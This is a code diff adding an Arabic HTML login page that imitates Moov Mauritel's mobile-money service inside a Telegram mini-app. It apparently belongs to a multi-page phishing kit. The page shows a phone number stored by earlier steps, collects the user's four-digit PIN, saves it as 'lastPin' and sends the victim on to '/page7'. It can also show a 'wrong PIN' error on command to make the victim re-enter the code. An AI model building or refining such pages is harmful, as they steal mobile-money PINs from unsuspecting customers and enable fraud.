@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Mauritel - تسجيل الدخول</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --moov-blue: #002B66;
+            --moov-blue-dark: #001f4d;
+            --moov-orange: #FF6600;
+            --moov-gradient: linear-gradient(180deg, #003380 0%, #002B66 100%);
+            --bg-color: #ffffff;
+            --text-dark: #121820;
+            --text-muted: #666666;
+            --border-blue: #002B66;
+            --btn-disabled-bg: #e2e8f0;
+            --btn-disabled-text: #a0aec0;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body { 
+            background-color: var(--bg-color); 
+            margin: 0; 
+            padding: 0;
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+        }
+
+        /* Top Header Area */
+        .header-box { 
+            width: 100%; 
+            background: var(--moov-gradient); 
+            padding: 30px 20px 25px; 
+            color: #ffffff; 
+            text-align: center; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-title {
+            font-size: 30px;
+            font-weight: 900;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            letter-spacing: -0.5px;
+        }
+
+        .header-title .region {
+            font-size: 13px;
+            margin-right: 8px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: var(--moov-orange);
+            color: #ffffff;
+            padding: 2px 8px;
+            border-radius: 6px;
+        }
+
+        .sub-header-text { 
+            font-size: 14px; 
+            margin-top: 6px; 
+            font-weight: 600;
+            color: #ffffff;
+            opacity: 0.9;
+        }
+
+        /* Content Area */
+        .main-content { 
+            width: 90%; 
+            max-width: 400px; 
+            margin: 25px auto 0; 
+            text-align: center; 
+            flex-grow: 1; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h2 { 
+            color: var(--moov-blue); 
+            font-size: 22px; 
+            margin: 10px 0 20px; 
+            font-weight: 800; 
+        }
+
+        /* 🚨 Red Status Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
+        }
+
+        /* Phone Display Field */
+        .phone-display {
+            width: 100%;
+            border: 2px solid var(--border-blue);
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--moov-blue);
+            background-color: #f0f4fa;
+            direction: ltr;
+        }
+
+        .flag-icon {
+            font-size: 20px;
+            line-height: 1;
+        }
+
+        /* PIN Section */
+        .pin-label { 
+            color: var(--text-muted); 
+            margin-bottom: 16px; 
+            font-size: 14px; 
+            font-weight: 600; 
+        }
+
+        .pin-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .pin-input-group { 
+            display: flex; 
+            gap: 12px; 
+            direction: ltr;
+        }
+
+        .pin-box {
+            width: 52px;
+            height: 52px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            outline: none;
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .pin-box:focus {
+            border-color: var(--moov-blue);
+        }
+
+        .pin-box.input-error {
+            border-color: #d93025;
+            background-color: #fff9f9;
+        }
+
+        .toggle-eye { 
+            position: absolute;
+            left: 0;
+            cursor: pointer; 
+            font-size: 20px; 
+            user-select: none;
+            color: var(--moov-blue);
+        }
+
+        .forgot-pin {
+            color: var(--text-muted);
+            font-size: 13px;
+            text-decoration: none;
+            margin-bottom: 35px;
+            display: inline-block;
+            font-weight: 500;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        .btn-submit.active {
+            background-color: var(--moov-orange);
+            color: #ffffff;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(255, 102, 0, 0.35);
+        }
+
+        .btn-submit.active:hover {
+            background-color: #e65c00;
+        }
+
+        /* Bottom Curved Footer */
+        .footer-box { 
+            width: 100%; 
+            background: var(--moov-gradient); 
+            padding: 35px 20px 20px; 
+            color: #ffffff; 
+            text-align: center; 
+            border-top-left-radius: 50% 30px; 
+            border-top-right-radius: 50% 30px; 
+            margin-top: auto;
+        }
+
+        .footer-title {
+            font-size: 26px;
+            font-weight: 900;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .footer-title .region {
+            font-size: 11px;
+            margin-right: 6px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: var(--moov-orange);
+            color: #ffffff;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .terms-text { 
+            font-size: 11px; 
+            margin-top: 15px; 
+            padding: 0 20px; 
+            line-height: 1.4; 
+            color: #ffffff;
+            font-weight: 500;
+            opacity: 0.9;
+        }
+
+        .terms-text u { 
+            color: #ffffff; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Section -->
+<div class="header-box">
+    <div class="header-title">
+        <span>Moov Mauritel</span><span class="region">موريتانيا</span>
+    </div>
+    <div class="sub-header-text">الخدمات المالية عبر الهاتف المحمول</div>
+</div>
+
+<!-- Main Login Form -->
+<div class="main-content">
+    <h2>تسجيل الدخول</h2>
+
+    <!-- Red Error Banner -->
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <!-- Displays Phone Number Filled in Previous Steps -->
+    <div class="phone-display">
+        <span class="flag-icon">🇲🇷</span>
+        <span>+222</span>
+        <span id="displayPhone">--</span>
+    </div>
+
+    <p class="pin-label">أدخل رمز PIN الخاص بك لـ Moov Mauritel</p>
+
+    <!-- PIN Inputs & Eye Icon -->
+    <div class="pin-wrapper">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+        </div>
+        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
+    </div>
+
+    <a href="#" class="forgot-pin">نسيت رمز PIN؟</a>
+
+    <button id="loginBtn" class="btn-submit" disabled>تسجيل الدخول</button>
+</div>
+
+<!-- Bottom Curved Footer -->
+<div class="footer-box">
+    <div class="footer-title">
+        <span>Moov Mauritel</span><span class="region">موريتانيا</span>
+    </div>
+    <div class="sub-header-text">الخدمات المالية عبر الهاتف المحمول</div>
+    <p class="terms-text">بإجراء تسجيل الدخول، فإنك توافق على <u>شروط وأحكام الاستخدام</u></p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
+    const errorDisplay = document.getElementById('errorDisplay');
+
+    // Retrieve saved phone from previous steps (localStorage)
+    let savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "45000000";
+    savedPhone = savedPhone.replace(/^\+?222/, '').trim();
+    displayPhone.textContent = savedPhone;
+
+    // Detect error parameter in URL query
+    const urlParams = new URLSearchParams(window.location.search);
+    const errParam = urlParams.get('error');
+
+    if (errParam === 'wrong_pin' || errParam === 'wrongpin') {
+        errorDisplay.textContent = "رمز PIN غير صحيح، يرجى إدخال رمز PIN الصحيح.";
+        errorDisplay.style.display = "block";
+        
+        pinBoxes.forEach(b => b.classList.add('input-error'));
+        if (pinBoxes.length > 0) pinBoxes[0].focus();
+    } else if (errParam === 'invalid_credentials' || errParam === 'invalidcredentials') {
+        errorDisplay.textContent = "البيانات غير صحيحة، يرجى إدخال البيانات الصحيحة.";
+        errorDisplay.style.display = "block";
+        
+        pinBoxes.forEach(b => b.classList.add('input-error'));
+        if (pinBoxes.length > 0) pinBoxes[0].focus();
+    }
+
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+
+            // Clear red error highlight on typing
+            pinBoxes.forEach(b => b.classList.remove('input-error'));
+            errorDisplay.style.display = "none";
+
+            if (box.value && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value.length === 1);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
+
+    eye.addEventListener('click', () => {
+        const isPassword = pinBoxes[0].type === "password";
+        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
+    });
+
+    loginBtn.addEventListener('click', () => {
+        if (!loginBtn.classList.contains('active')) return;
+        
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+
+        let pin = "";
+        pinBoxes.forEach(b => pin += b.value);
+        localStorage.setItem('lastPin', pin);
+
+        errorDisplay.style.display = "none";
+
+        window.location.href = "/page7";
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
